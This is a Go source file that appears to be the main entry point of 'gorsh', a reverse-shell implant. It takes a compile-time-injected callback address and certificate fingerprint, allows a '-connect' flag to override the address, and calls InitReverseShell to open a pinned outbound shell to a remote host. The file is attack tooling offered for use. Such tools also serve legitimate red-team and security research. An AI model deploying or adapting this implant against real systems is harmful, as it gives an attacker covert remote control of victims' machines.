package main

import (
	"encoding/hex"
	"flag"
	"os"
	"strings"

	"github.com/audibleblink/gorsh/internal/core"
)

const (
	ErrCouldNotDecode  = 1 << iota
	ErrHostUnreachable = iota
	ErrBadFingerprint  = iota
)

var (
	connectString string
	fingerPrint   string
)

func main() {
	dev := flag.Bool("dev", false, "Run the shell locally")
	override := flag.String("connect", "", "Override compile-time-injected connectString")
	flag.Parse()

	if *dev {
		core.StartShell(os.Stdin)
	}

	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(ErrCouldNotDecode)
		}

		if *override == "" {
			core.InitReverseShell(connectString, bytesFingerprint)
		} else {
			core.InitReverseShell(*override, bytesFingerprint)
		}
	}
}
